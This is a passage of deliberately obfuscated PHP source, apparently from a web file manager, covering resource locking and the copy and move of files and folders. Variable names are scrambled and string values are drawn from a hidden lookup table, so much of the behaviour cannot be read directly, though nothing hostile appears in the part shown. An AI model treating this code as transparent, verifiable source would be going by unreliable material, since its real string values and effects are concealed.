$this->_lockParent($÷õ¢½‚Æ, array($£ÈÇˆ[635], $£ÈÇˆ[637]), $¬Åï‹ñ°); $this->_lockEvent($÷õ¢½‚Æ, array($£ÈÇˆ[642], $£ÈÇˆ[638], $£ÈÇˆ[639]), $¬Åï‹ñ°); } private function _lockCheck($¼±‹²ºô, $™‹º´õ¶) { $¾³“ØÄÉ =& $_SERVER[ˆö¿ÚÌ¼]; $ë‰ŸĞƒñ = $this->sourceInfo($™‹º´õ¶); $™¼à·Á = $¼±‹²ºô . $¾³“ØÄÉ[10] . $™‹º´õ¶; $this->_lockTimeStart[$™¼à·Á] = timeFloat(); if (!is_array($ë‰ŸĞƒñ)) { return; } $à‡‰†Ï = LNG($¾³“ØÄÉ[643]); CacheLock::setErrorMsg($¾³“ØÄÉ[176] . htmlspecialchars($ë‰ŸĞƒñ[$¾³“ØÄÉ[32]]) . $¾³“ØÄÉ[178] . $à‡‰†Ï); $this->_lockKey($™¼à·Á, 1); $this->_lockKey($™¼à·Á, 0); $õ‹öÊ¾  = array_reverse($this->parentLevelArray($ë‰ŸĞƒñ[$¾³“ØÄÉ[598]])); foreach ($õ‹öÊ¾  as $Â¯ƒµ·‘) { $™¼à·Á = $¼±‹²ºô . $¾³“ØÄÉ[644] . $Â¯ƒµ·‘; if (CacheLock::lockGet($¾³“ØÄÉ[645] . $™¼à·Á)) { $ë‰ŸĞƒñ = $this->sourceInfo($Â¯ƒµ·‘); CacheLock::setErrorMsg($¾³“ØÄÉ[176] . htmlspecialchars($ë‰ŸĞƒñ[$¾³“ØÄÉ[32]]) . $¾³“ØÄÉ[178] . $à‡‰†Ï); $this->_lockKey($™¼à·Á, 1); $this->_lockKey($™¼à·Á, 0); } } } private function _lockCheckEnd($¹¹Šô¶©, $­‡ÊÓ¦À) { $¦£¤É»® =& $_SERVER[ˆö¿ÚÌ¼]; $‡¢Ó¹í¥ = $¹¹Šô¶© . $¦£¤É»®[10] . $­‡ÊÓ¦À; CacheLock::setErrorMsg($¦£¤É»®[457]); if (!isset($this->_lockTimeStart[$‡¢Ó¹í¥])) { return; } $¤·•ØëÆ = timeFloat() - $this->_lockTimeStart[$‡¢Ó¹í¥]; unset($this->_lockTimeStart[$‡¢Ó¹í¥]); if ($¤·•ØëÆ > 0.5) { unset(self::$cacheSourceInfo[$¦£¤É»®[545] . $­‡ÊÓ¦À]); } $„é†™ç• = $this->sourceInfo($­‡ÊÓ¦À); if (!$„é†™ç•) { show_json(LNG($¦£¤É»®[108]), !1); } } private function _lockParent($Õ•†ûê¸, $°°³õáÅ, $Î°Ü«ä÷) { if (!$this->autoLockSet) { return; } $úçíœ¶ = $this->sourceInfo($Õ•†ûê¸); if (!is_array($úçíœ¶)) { return; } $»¾Æû¦Ë = array_reverse($this->parentLevelArray($úçíœ¶[$_SERVER[ˆö¿ÚÌ¼][598]])); foreach ($»¾Æû¦Ë as $çÉö³†‡) { $this->_lockEvent($çÉö³†‡, $°°³õáÅ, $Î°Ü«ä÷); } } private function _lockEvent($ »—ÃºÚ, $õ¥”²é», $–áÈ§µÓ) { $ÀÊÆ°¥Ş =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->autoLockSet) { return; } foreach ($õ¥”²é» as $°ò‹Åµ) { $„âñì£Á = $°ò‹Åµ . $ÀÊÆ°¥Ş[10] . $ »—ÃºÚ; if ($–áÈ§µÓ && CacheLock::lockGet($ÀÊÆ°¥Ş[645] . $„âñì£Á)) { continue; } $this->_lockKey($„âñì£Á, $–áÈ§µÓ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Ş”´Š¾», $Æ…Õñø = 1) { $ŒÅúÈ¨û = $_SERVER[ˆö¿ÚÌ¼][645] . md5($Ş”´Š¾»); if ($Æ…Õñø) { if (isset(self::$_lockItemArr[$ŒÅúÈ¨û])) { return; } self::$_lockItemArr[$ŒÅúÈ¨û] = 1; CacheLock::lock($ŒÅúÈ¨û, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ŒÅúÈ¨û])) { return; } unset(self::$_lockItemArr[$ŒÅúÈ¨û]); CacheLock::unlock($ŒÅúÈ¨û); } } public function isParentOf($©µÑô™, $æ‚Õ‚í‰) { $öÑş©óÅ =& $_SERVER[ˆö¿ÚÌ¼]; $İšıÊó¡ = $this->sourceInfo($©µÑô™); $¬½àÂ¹Ù = $this->sourceInfo($æ‚Õ‚í‰); $÷¿‹ñò = $İšıÊó¡[$öÑş©óÅ[598]] . $İšıÊó¡[$öÑş©óÅ[194]] . $öÑş©óÅ[50]; $•£Ç¥û½ = $¬½àÂ¹Ù[$öÑş©óÅ[598]] . $¬½àÂ¹Ù[$öÑş©óÅ[194]] . $öÑş©óÅ[50]; $ØºÊ€·ï = strpos($•£Ç¥û½, $÷¿‹ñò) === 0; return $ØºÊ€·ï; } private $targetIsDelete = 0; public function copy($»¢ôå±€, $©ôÌ£Ù¦, $ÍşÄ±Éõ = REPEAT_REPLACE, $´œÂ…¹À = '') { $ÜŞ¦¬ =& $_SERVER[ˆö¿ÚÌ¼]; $ç†ìÛêí = $this->sourceInfo($»¢ôå±€); $Ï¨ªîÆ = $this->sourceInfo($©ôÌ£Ù¦); if (!$ç†ìÛêí || !$Ï¨ªîÆ || $Ï¨ªîÆ[$ÜŞ¦¬[497]] != $ÜŞ¦¬[91]) { return !1; } if ($this->isParentOf($»¢ôå±€, $©ôÌ£Ù¦)) { return !1; } $¯Â«ÔË = $´œÂ…¹À ? $´œÂ…¹À : $ç†ìÛêí[$ÜŞ¦¬[32]]; $this->lockCopyStart($»¢ôå±€); $this->lockWriteStart($©ôÌ£Ù¦, $¯Â«ÔË); $Ù’àó”¶ = array($ÜŞ¦¬[646] => array(), $ÜŞ¦¬[647] => array(), $ÜŞ¦¬[648] => array()); $this->targetIsDelete = intval($ç†ìÛêí[$ÜŞ¦¬[517]]); $ÎĞ«¯ö¹ = $this->fileNameExistAuto($©ôÌ£Ù¦, $ç†ìÛêí); $’½Ö½©¹ = $this->_copy($»¢ôå±€, $©ôÌ£Ù¦, $ÍşÄ±Éõ, $Ù’àó”¶, !0, $´œÂ…¹À); $this->_childrenListClear(); $this->lockCopyEnd($»¢ôå±€); $this->lockWriteEnd($©ôÌ£Ù¦, $¯Â«ÔË); if ($ç†ìÛêí[$ÜŞ¦¬[497]] == $ÜŞ¦¬[91] && $ÎĞ«¯ö¹ == $’½Ö½©¹) { $this->folderSizeResetChildren($ÎĞ«¯ö¹); } Model($ÜŞ¦¬[649])->addAll($Ù’àó”¶[$ÜŞ¦¬[647]], array(), !0); if ($ÎĞ«¯ö¹ != $’½Ö½©¹ || $ç†ìÛêí[$ÜŞ¦¬[497]] == $ÜŞ¦¬[91]) { Model($ÜŞ¦¬[650])->eventCopy($’½Ö½©¹); } $this->saveAll($Ù’àó”¶[$ÜŞ¦¬[648]]); Model($ÜŞ¦¬[233])->linkAdd($Ù’àó”¶[$ÜŞ¦¬[646]]); $this->folderSizeReset($©ôÌ£Ù¦); $this->updateModifyTime($©ôÌ£Ù¦); return $’½Ö½©¹; } private function _copy($·¶ü™–Œ, $…œ×¢¿±, $ÃŒ¯È­†, &$×£€¬ã¹, $ÁøÀ¶í, $€àÑİ‚ = '') { $âÛõ‰ƒ¯ =& $_SERVER[ˆö¿ÚÌ¼]; $ñ¶ƒ‰ïï = $this->sourceInfoCache($·¶ü™–Œ); $µ‡ŸŒ·• = $ñ¶ƒ‰ïï[$âÛõ‰ƒ¯[497]] == $âÛõ‰ƒ¯[91]; $‰ôáõº’ = $€àÑİ‚ ? $€àÑİ‚ : $ñ¶ƒ‰ïï[$âÛõ‰ƒ¯[32]]; $ŒÆÎª³˜ = $this->fileNameExistAuto($…œ×¢¿±, $ñ¶ƒ‰ïï); if ($ÁøÀ¶í) { $this->_childrenAllMake($·¶ü™–Œ); if ($µ‡ŸŒ·• && $ŒÆÎª³˜) { $this->_childrenAllMake($ŒÆÎª³˜); } } if (!$ŒÆÎª³˜) { return $this->_copyCreate($·¶ü™–Œ, $…œ×¢¿±, $‰ôáõº’, $×£€¬ã¹); } $ù¨Ÿ—úÆ = $ŒÆÎª³˜; if ($µ‡ŸŒ·•) { if ($ÃŒ¯È­† == REPEAT_RENAME_FOLDER) { $‰ôáõº’ = $this->fileNameAutoCache($…œ×¢¿±, $‰ôáõº’, $ÃŒ¯È­†, $µ‡ŸŒ·•); $ù¨Ÿ—úÆ = $this->_copyCreate($·¶ü™–Œ, $…œ×¢¿±, $‰ôáõº’, $×£€¬ã¹); } else { $£şùüõ = $this->_childrenList($·¶ü™–Œ); foreach ($£şùüõ as $Ïá¾ßŠÃ) { $this->_copy($Ïá¾ßŠÃ[$âÛõ‰ƒ¯[194]], $ŒÆÎª³˜, $ÃŒ¯È­†, $×£€¬ã¹, !1); } } } else { if ($ÃŒ¯È­† == REPEAT_RENAME || $ÃŒ¯È­† == REPEAT_RENAME_FOLDER) { $‰ôáõº’ = $this->fileNameAutoCache($…œ×¢¿±, $‰ôáõº’, $ÃŒ¯È­†, $µ‡ŸŒ·•); $ù¨Ÿ—úÆ = $this->_copyCreate($·¶ü™–Œ, $…œ×¢¿±, $‰ôáõº’, $×£€¬ã¹); } else { if ($ÃŒ¯È­† == REPEAT_REPLACE) { $‘€óÊç = $this->sourceInfoCache($ŒÆÎª³˜); $ù¸í— = $this->fileHistory($‘€óÊç, $ñ¶ƒ‰ïï[$âÛõ‰ƒ¯[555]], $ñ¶ƒ‰ïï[$âÛõ‰ƒ¯[79]]); if ($ù¸í—) { $×£€¬ã¹[$âÛõ‰ƒ¯[646]][] = $ñ¶ƒ‰ïï[$âÛõ‰ƒ¯[555]]; } } else { if ($ÃŒ¯È­† == REPEAT_SKIP) { } } } Hook::trigger($âÛõ‰ƒ¯[651], array($âÛõ‰ƒ¯[652], $ñ¶ƒ‰ïï, 0)); } return $ù¨Ÿ—úÆ; } private function _copyCreate($Ğ¥Ê×³ö, $§¥“²¿†, $À“Ş©ğè, &$ãÁÍ…×) { $ñÛßÌÖú =& $_SERVER[ˆö¿ÚÌ¼]; $¹¥€˜í£ = $this->sourceInfoCache($Ğ¥Ê×³ö); $Š½äîÁ¹ = $this->sourceInfoCache($§¥“²¿†); $‘å›®çò = $this->_makeItemData($¹¥€˜í£, $Š½äîÁ¹, $À“Ş©ğè); Hook::trigger($ñÛßÌÖú[653], $‘å›®çò); Hook::trigger($ñÛßÌÖú[654], array($ñÛßÌÖú[655], $‘å›®çò, 0)); $¶° ÖÍé = $this->add($‘å›®çò); $¾½¢½Á¢ = array($ñÛßÌÖú[194] => $¶° ÖÍé, $ñÛßÌÖú[32] => $À“Ş©ğè); $this->_copyApplyMeta($¾½¢½Á¢, $ãÁÍ…×); if ($¹¥€˜í£[$ñÛßÌÖú[497]] != $ñÛßÌÖú[91]) { $ãÁÍ…×[$ñÛßÌÖú[646]][] = $¹¥€˜í£[$ñÛßÌÖú[555]]; return $¶° ÖÍé; } $ª¯’ûœš = array(); $Õ”±¹éå = array(); $this->_childrenListAll($Ğ¥Ê×³ö, $ª¯’ûœš); $º·¡ÁÙ× = count($ª¯’ûœš); if ($º·¡ÁÙ× == 0) { return $¶° ÖÍé; } $ñ“Ó¦Ş” = $this->sourceInfo($¶° ÖÍé); foreach ($ª¯’ûœš as $»¼Ïè•) { $¥»÷ÈÛ = $this->_makeItemData($»¼Ïè•, $ñ“Ó¦Ş”, $»¼Ïè•[$ñÛßÌÖú[32]]); $¥»÷ÈÛ[$ñÛßÌÖú[598]] = $»¼Ïè•[$ñÛßÌÖú[598]]; $Õ”±¹éå[] = $¥»÷ÈÛ; } $this->chunkEventSet($ñÛßÌÖú[656], array($ñÛßÌÖú[657], $‘å›®çò, $º·¡ÁÙ×)); $this->addAll($Õ”±¹éå, array(), !1); $Ì¨•­âõ = $this->where(array($ñÛßÌÖú[193] => $¶° ÖÍé))->select(); $§¹Ñ»Ñ = $this->_childrenMakeRelation($ª¯’ûœš, $Ì¨•­âõ); $§¹Ñ»Ñ[$Ğ¥Ê×³ö] = $¶° ÖÍé; $ø˜ÔùŸ = array(); $¶í¬¤ü¿ = array(); foreach ($Ì¨•­âõ as $»¼Ïè•) { $Ÿ‡…±„é = $»¼Ïè•[$ñÛßÌÖú[194]]; $§…ö‚› = $this->_childrenMatch($§¹Ñ»Ñ, $»¼Ïè•, $ñ“Ó¦Ş”); $ø˜ÔùŸ[] = array($ñÛßÌÖú[194], $Ÿ‡…±„é, $ñÛßÌÖú[193], $§…ö‚›[$ñÛßÌÖú[193]]); $¶í¬¤ü¿[] = array($ñÛßÌÖú[194], $Ÿ‡…±„é, $ñÛßÌÖú[598], $§…ö‚›[$ñÛßÌÖú[598]]); $this->_copyApplyMeta($»¼Ïè•, $ãÁÍ…×); if ($»¼Ïè•[$ñÛßÌÖú[497]] != $ñÛßÌÖú[91]) { $ãÁÍ…×[$ñÛßÌÖú[646]][] = $»¼Ïè•[$ñÛßÌÖú[555]]; } } $this->chunkEventSet($ñÛßÌÖú[658], array($ñÛßÌÖú[659], $‘å›®çò, $º·¡ÁÙ×)); $this->saveAll($ø˜ÔùŸ); $this->chunkEventSet($ñÛßÌÖú[660], array($ñÛßÌÖú[661], $‘å›®çò, $º·¡ÁÙ×)); $this->saveAll($¶í¬¤ü¿); return $¶° ÖÍé; } private function _childrenMakeRelation($ò”îŸ÷ú, $«èÊóûç) { $âÀÕÚÜº =& $_SERVER[ˆö¿ÚÌ¼]; $³©¿äƒ = array(); $×ñ¯ÃÔï = array(); foreach ($ò”îŸ÷ú as $ÚŸÎ©·û) { $³¼¹şŒõ = $ÚŸÎ©·û[$âÀÕÚÜº[32]] . $âÀÕÚÜº[8] . $ÚŸÎ©·û[$âÀÕÚÜº[598]]; $³©¿äƒ[$³¼¹şŒõ] = $ÚŸÎ©·û[$âÀÕÚÜº[194]]; } foreach ($«èÊóûç as $ÚŸÎ©·û) { $³¼¹şŒõ = $ÚŸÎ©·û[$âÀÕÚÜº[32]] . $âÀÕÚÜº[8] . $ÚŸÎ©·û[$âÀÕÚÜº[598]]; $¥©°å¸¹ = $³©¿äƒ[$³¼¹şŒõ]; $×ñ¯ÃÔï[$¥©°å¸¹] = $ÚŸÎ©·û[$âÀÕÚÜº[194]]; } return $×ñ¯ÃÔï; } private function _childrenMatch($şô Ô®¬, $²ßƒÂˆ®, $Åü‰öğÏ) { $¡éŠ¸ª =& $_SERVER[ˆö¿ÚÌ¼]; $£±…Åùñ = $Åü‰öğÏ[$¡éŠ¸ª[598]]; $Êóì‘Øİ = $this->parentLevelArray($²ßƒÂˆ®[$¡éŠ¸ª[598]]); foreach ($Êóì‘Øİ as $ı¿ŠŠ´Á) { if (isset($şô Ô®¬[$ı¿ŠŠ´Á])) { $£±…Åùñ .= $şô Ô®¬[$ı¿ŠŠ´Á] . $¡éŠ¸ª[662]; } } $£±…Åùñ = rtrim($£±…Åùñ, $¡éŠ¸ª[50]) . $¡éŠ¸ª[50]; $ÍàÈïª = $this->parentLevelArray($£±…Åùñ); $Ç’˜½™Ñ = $ÍàÈïª[count($ÍàÈïª) - 1]; return array($¡éŠ¸ª[193] => $Ç’˜½™Ñ, $¡éŠ¸ª[598] => $£±…Åùñ); } private function _makeItemData($Ààë›, $Ÿê€â×Í, $óÇœª¡é) { $ÉúıÎ¸Æ =& $_SERVER[ˆö¿ÚÌ¼]; $ú±óóƒ = array($ÉúıÎ¸Æ[663] => $Ààë›[$ÉúıÎ¸Æ[497]], $ÉúıÎ¸Æ[506] => $óÇœª¡é, $ÉúıÎ¸Æ[664] => $Ààë›[$ÉúıÎ¸Æ[498]] ? $Ààë›[$ÉúıÎ¸Æ[498]] : $ÉúıÎ¸Æ[12], $ÉúıÎ¸Æ[556] => $Ààë›[$ÉúıÎ¸Æ[555]] ? $Ààë›[$ÉúıÎ¸Æ[555]] : 0, $ÉúıÎ¸Æ[634] => $Ààë›[$ÉúıÎ¸Æ[79]] ? $Ààë›[$ÉúıÎ¸Æ[79]] : 0, $ÉúıÎ¸Æ[665] => intval($Ÿê€â×Í[$ÉúıÎ¸Æ[191]]), $ÉúıÎ¸Æ[666] => intval($Ÿê€â×Í[$ÉúıÎ¸Æ[583]]), $ÉúıÎ¸Æ[667] => intval(USER_ID), $ÉúıÎ¸Æ[668] => intval(USER_ID), $ÉúıÎ¸Æ[489] => intval($Ÿê€â×Í[$ÉúıÎ¸Æ[194]]), $ÉúıÎ¸Æ[669] => $Ÿê€â×Í[$ÉúıÎ¸Æ[598]] . $Ÿê€â×Í[$ÉúıÎ¸Æ[194]] . $ÉúıÎ¸Æ[50], $ÉúıÎ¸Æ[510] => $Ààë›[$ÉúıÎ¸Æ[88]] ? $Ààë›[$ÉúıÎ¸Æ[88]] : time(), $ÉúıÎ¸Æ[516] => 0, $ÉúıÎ¸Æ[670] => $ÉúıÎ¸Æ[12]); return $ú±óóƒ; } private function _copyApplyMeta($¯¿ÑşÅÉ, &$‚âï¬ğ•) { $ö†Ãû¨ =& $_SERVER[ˆö¿ÚÌ¼]; $“ğßö­¨ = $¯¿ÑşÅÉ[$ö†Ãû¨[194]]; $—ŞªøÜ‚ = $¯¿ÑşÅÉ[$ö†Ãû¨[32]]; if (!isset($¯¿ÑşÅÉ[$ö†Ãû¨[671]]) || !$¯¿ÑşÅÉ[$ö†Ãû¨[671]] || $¯¿ÑşÅÉ[$ö†Ãû¨[671]] == $ö†Ãû¨[231]) { $‚âï¬ğ•[$ö†Ãû¨[648]][] = array($ö†Ãû¨[194], $“ğßö­¨, $ö†Ãû¨[671], short_id($“ğßö­¨)); } if (Input::check($—ŞªøÜ‚, $ö†Ãû¨[672])) { $‚âï¬ğ•[$ö†Ãû¨[647]][] = array($ö†Ãû¨[194] => $“ğßö­¨, $ö†Ãû¨[97] => $ö†Ãû¨[550], $ö†Ãû¨[453] => str_replace($ö†Ãû¨[53], $ö†Ãû¨[12], Pinyin::get($—ŞªøÜ‚))); $‚âï¬ğ•[$ö†Ãû¨[647]][] = array($ö†Ãû¨[194] => $“ğßö­¨, $ö†Ãû¨[97] => $ö†Ãû¨[549], $ö†Ãû¨[453] => Pinyin::get($—ŞªøÜ‚, $ö†Ãû¨[673])); } $‚âï¬ğ•[$ö†Ãû¨[647]][] = array($ö†Ãû¨[194] => $“ğßö­¨, $ö†Ãû¨[97] => $ö†Ãû¨[529], $ö†Ãû¨[453] => KodSort::makeStr($—ŞªøÜ‚)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ÏÉúĞƒ™) { $´İûÏ‚û =& $_SERVER[ˆö¿ÚÌ¼]; $è—’ÎÆğ = $this->sourceInfo($ÏÉúĞƒ™); $ŸÏ¯¡ãó = $´İûÏ‚û[674]; $Ã¼”Ş µ = array($´İûÏ‚û[598] => array($´İûÏ‚û[629], $è—’ÎÆğ[$´İûÏ‚û[598]] . $ÏÉúĞƒ™ . $´İûÏ‚û[630]), $´İûÏ‚û[517] => $this->targetIsDelete); $ÖÛ¨ùü“ = $this->field($ŸÏ¯¡ãó)->where($Ã¼”Ş µ)->select(); if (!$ÖÛ¨ùü“) { return; } $ÖÛ¨ùü“ = array_to_keyvalue($ÖÛ¨ùü“, $´İûÏ‚û[194]); foreach ($ÖÛ¨ùü“ as $ààÄ¶Éİ) { $¢¥Õ¼•³ = $ààÄ¶Éİ[$´İûÏ‚û[193]]; $ÏÉúĞƒ™ = $ààÄ¶Éİ[$´İûÏ‚û[194]]; if (!isset($this->_childrenListCache[$ÏÉúĞƒ™]) && $ààÄ¶Éİ[$´İûÏ‚û[497]] == $´İûÏ‚û[91]) { $this->_childrenListCache[$ÏÉúĞƒ™] = array(); } if (!isset($this->_childrenListCache[$¢¥Õ¼•³])) { $this->_childrenListCache[$¢¥Õ¼•³] = array(); } $this->_childrenListCache[$¢¥Õ¼•³][$ÏÉúĞƒ™] = $ààÄ¶Éİ; $this->_childrenItemCache[$ÏÉúĞƒ™] = $ààÄ¶Éİ; } } private function _childrenListAll($ñ©™â´È, &$®†¤ÓŠ×) { $Œ³Ù·© =& $_SERVER[ˆö¿ÚÌ¼]; if (!isset($this->_childrenListCache[$ñ©™â´È])) { return; } $Ÿñ§Ä±¡ = $this->_childrenListCache[$ñ©™â´È]; foreach ($Ÿñ§Ä±¡ as $¢¦‰Ş¥ª => $Ÿñ±Ş«ú) { $®†¤ÓŠ×[$¢¦‰Ş¥ª] = $Ÿñ±Ş«ú; if ($Ÿñ±Ş«ú[$Œ³Ù·©[497]] == $Œ³Ù·©[91]) { $this->_childrenListAll($¢¦‰Ş¥ª, $®†¤ÓŠ×); } } } private function sourceInfoCache($üãì˜ ») { if (isset($this->_childrenItemCache[$üãì˜ »])) { return $this->_childrenItemCache[$üãì˜ »]; } return $this->sourceInfo($üãì˜ »); } private function _childrenList($“ĞìÑàË) { if (isset($this->_childrenListCache[$“ĞìÑàË])) { return $this->_childrenListCache[$“ĞìÑàË]; } return $this->_childrenListSelect($“ĞìÑàË); } private function _childrenListSelect($ê¦Áß²) { $ô„‰üá• =& $_SERVER[ˆö¿ÚÌ¼]; $›³ˆØ“ = array($ô„‰üá•[193] => $ê¦Áß², $ô„‰üá•[517] => $this->targetIsDelete); $¥û€ = $this->where($›³ˆØ“)->select(); $¥û€ = $¥û€ ? $¥û€ : array(); $šÒ†”¤è = array_to_keyvalue($¥û€, $ô„‰üá•[194]); $this->_childrenListCache[$ê¦Áß²] = $šÒ†”¤è; foreach ($šÒ†”¤è as $ê¦Áß² => $ª˜çÛ÷ì) { $this->_childrenItemCache[$ê¦Áß²] = $ª˜çÛ÷ì; } return $šÒ†”¤è; } private function fileNameExistAuto($ìÍˆß·è, $Ã¼™ü‹) { $ÏÃê«—­ =& $_SERVER[ˆö¿ÚÌ¼]; if ($Ã¼™ü‹[$ÏÃê«—­[517]] == $ÏÃê«—­[91]) { return $this->fileNameExist($ìÍˆß·è, $Ã¼™ü‹[$ÏÃê«—­[32]]); } return $this->fileNameExistCache($ìÍˆß·è, $Ã¼™ü‹[$ÏÃê«—­[32]]); } private function fileNameExistCache($ûÁ¬ÃÂÜ, $éÖ¤ßœ) { $÷ĞÎ“È =& $_SERVER[ˆö¿ÚÌ¼]; $éÖ¤ßœ = strtolower($éÖ¤ßœ); $¥¨µ£§Ã = $this->_childrenList($ûÁ¬ÃÂÜ); foreach ($¥¨µ£§Ã as $ÆŞôæ ) { if ($éÖ¤ßœ == strtolower($ÆŞôæ [$÷ĞÎ“È[32]])) { return $ÆŞôæ [$÷ĞÎ“È[194]]; } } return !1; } private function fileNameAutoCache($ç·•Ì”‹, $äßáìâì, $‹º¶¸¢†, $£§óñ—ˆ) { $õ³ïû¡é =& $_SERVER[ˆö¿ÚÌ¼]; $‚ş€—çë = $this->_childrenList($ç·•Ì”‹); $éÜ†’Îô = array_to_keyvalue($‚ş€—çë, $õ³ïû¡é[12], $õ³ïû¡é[32]); return $this->fileNameAutoGet($éÜ†’Îô, $äßáìâì, $‹º¶¸¢†, $£§óñ—ˆ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($øó¿«“°, $®ÏØÃ—, $•Ó¶ĞÔ° = REPEAT_REPLACE, $ÕªÎÊ®£ = '') { $¢§×Ş­ =& $_SERVER[ˆö¿ÚÌ¼]; $¾‘Î¦œ¸ = $this->sourceInfo($øó¿«“°); $àØ¹ÁÀ– = $this->sourceInfo($®ÏØÃ—); if ($¾‘Î¦œ¸[$¢§×Ş­[193]] == $àØ¹ÁÀ–[$¢§×Ş­[194]]) { if ($¾‘Î¦œ¸[$¢§×Ş­[517]] == $¢§×Ş­[91]) { Model($¢§×Ş­[515])->restore(array($øó¿«“°)); } if (!$ÕªÎÊ®£ || $ÕªÎÊ®£ == $¾‘Î¦œ¸[$¢§×Ş­[32]]) { return $øó¿«“°; } } $³Øêæû— = $this->pathInfoMore($øó¿«“°); if ($this->isParentOf($øó¿«“°, $®ÏØÃ—)) { return !1; } if (!$¾‘Î¦œ¸ || !$àØ¹ÁÀ– || $àØ¹ÁÀ–[$¢§×Ş­[497]] != $¢§×Ş­[91]) { return !1; } Hook::trigger($¢§×Ş­[675], $³Øêæû—); $this->targetIsDelete = intval($¾‘Î¦œ¸[$¢§×Ş­[517]]); if ($¾‘Î¦œ¸[$¢§×Ş­[193]] == $®ÏØÃ— && $ÕªÎÊ®£ != $¾‘Î¦œ¸[$¢§×Ş­[32]]) { $»§Éü“á = $this->fileNameExist($®ÏØÃ—, $ÕªÎÊ®£); if ($»§Éü“á && $¾‘Î¦œ¸[$¢§×Ş­[497]] == $¢§×Ş­[231]) { $Õî„‹ç = $this->sourceInfo($»§Éü“á); $ô¶üÇœˆ = $this->fileHistory($Õî„‹ç, $¾‘Î¦œ¸[$¢§×Ş­[555]], $¾‘Î¦œ¸[$¢§×Ş­[79]]); if (!$ô¶üÇœˆ) { Model($¢§×Ş­[558])->remove($¾‘Î¦œ¸[$¢§×Ş­[555]]); } $this->removeNow($øó¿«“°, !1); $this->folderSizeReset($®ÏØÃ—); Hook::trigger($¢§×Ş­[676], $³Øêæû—); return $»§Éü“á; } } $’Ì¬ÇĞË = $ÕªÎÊ®£ ? $ÕªÎÊ®£ : $¾‘Î¦œ¸[$¢§×Ş­[32]]; $this->lockMoveStart($øó¿«“°); $this->lockWriteStart($®ÏØÃ—, $’Ì¬ÇĞË); $êÂœ‚È = array($¢§×Ş­[646] => array(), $¢§×Ş­[677] => !1); $this->clearShare($øó¿«“°, $®ÏØÃ—); $ƒ§ªàÛì = $this->fileNameExistAuto($®ÏØÃ—, $¾‘Î¦œ¸); $„•ãıƒ© = $this->_move($øó¿«“°, $®ÏØÃ—, $•Ó¶ĞÔ°, $êÂœ‚È, $ÕªÎÊ®£); $this->sourceCacheClear(); if ($¾‘Î¦œ¸[$¢§×Ş­[497]] == $¢§×Ş­[91] && $ƒ§ªàÛì) { $this->folderSizeResetChildren($„•ãıƒ©); } Model($¢§×Ş­[233])->linkAdd($êÂœ‚È[$¢§×Ş­[646]]); if ($„•ãıƒ© && $ƒ§ªàÛì && $êÂœ‚È[$¢§×Ş­[677]]) { $’œ§âİş = $¾‘Î¦œ¸[$¢§×Ş­[497]] == $¢§×Ş­[91] ? $this->_childrenListSelect($øó¿«“°) : !1; $åÃĞÏà¨ = $’œ§âİş && count($’œ§âİş) > 0 ? !0 : !1; $this->removeNow($øó¿«“°, $åÃĞÏà¨); } $this->lockMoveEnd($øó¿«“°); $this->lockWriteEnd($®ÏØÃ—, $’Ì¬ÇĞË); $this->folderSizeReset($¾‘Î¦œ¸[$¢§×Ş­[193]]); $this->folderSizeReset($®ÏØÃ—); $Å¾Öµãğ = array($¾‘Î¦œ¸[$¢§×Ş­[193]], $®ÏØÃ—); if ($¾‘Î¦œ¸[$¢§×Ş­[497]] == $¢§×Ş­[91]) { $Å¾Öµãğ[] = $øó¿«“°; } $this->updateModifyTime($Å¾Öµãğ); Model($¢§×Ş­[650])->eventMove($øó¿«“°, $¾‘Î¦œ¸[$¢§×Ş­[193]], $®ÏØÃ—); Hook::trigger($¢§×Ş­[676], $³Øêæû—); return $„•ãıƒ©; } private function _move($Äá¿‰“, $û²˜º½Ê, $ğô›ô , &$ßìÅ£åì, $î·î‘•Ñ = '') { $ÁçÔ€ŒÙ =& $_SERVER[ˆö¿ÚÌ¼]; $ø·¼¥”µ = $this->sourceInfo($Äá¿‰“); $‡¼Ë»Œµ = $ø·¼¥”µ[$ÁçÔ€ŒÙ[497]] == $ÁçÔ€ŒÙ[91]; $º•ì…œÁ = $î·î‘•Ñ ? $î·î‘•Ñ : $ø·¼¥”µ[$ÁçÔ€ŒÙ[32]]; $ó¿…·Ôí = $this->fileNameExistAuto($û²˜º½Ê, $ø·¼¥”µ); $this->lockMoveStart($Äá¿‰“); $this->lockWriteStart($û²˜º½Ê, $º•ì…œÁ); if (!$ó¿…·Ôí) { return $this->_moveForce($Äá¿‰“, $û²˜º½Ê, $º•ì…œÁ); } $‚ÔÎÈ´Î = $ó¿…·Ôí; $ééª ı¬ = !1; if ($‡¼Ë»Œµ) { if ($ğô›ô  == REPEAT_RENAME_FOLDER) { $º•ì…œÁ = $this->fileNameAuto($û²˜º½Ê, $º•ì…œÁ, $ğô›ô , $‡¼Ë»Œµ); $‚ÔÎÈ´Î = $this->_moveForce($Äá¿‰“, $û²˜º½Ê, $º•ì…œÁ); } else { $²¼Ä©£Â = $this->_childrenListSelect($Äá¿‰“); foreach ($²¼Ä©£Â as $×¢œÊø) { $ïÃŞœÊ© = REPEAT_REPLACE; $this->_move($×¢œÊø[$ÁçÔ€ŒÙ[194]], $ó¿…·Ôí, $ïÃŞœÊ©, $ßìÅ£åì); } $ééª ı¬ = !0; } } else { if ($ğô›ô  == REPEAT_RENAME || $ğô›ô  == REPEAT_RENAME_FOLDER) { $º•ì…œÁ = $this->fileNameAuto($û²˜º½Ê, $º•ì…œÁ, $ğô›ô , $‡¼Ë»Œµ); $‚ÔÎÈ´Î = $this->_moveForce($Äá¿‰“, $û²˜º½Ê, $º•ì…œÁ); } else { $€Ñ±®İœ = $this->sourceInfoCache($ó¿…·Ôí); $‰·ÃÈ†‡ = $this->fileHistory($€Ñ±®İœ, $ø·¼¥”µ[$ÁçÔ€ŒÙ[555]], $ø·¼¥”µ[$ÁçÔ€ŒÙ[79]]); if ($‰·ÃÈ†‡) { $ßìÅ£åì[$ÁçÔ€ŒÙ[646]][] = $ø·¼¥”µ[$ÁçÔ€ŒÙ[555]]; } $ééª ı¬ = !0; } } if ($ééª ı¬) { $ßìÅ£åì[$ÁçÔ€ŒÙ[677]] = !0; } return 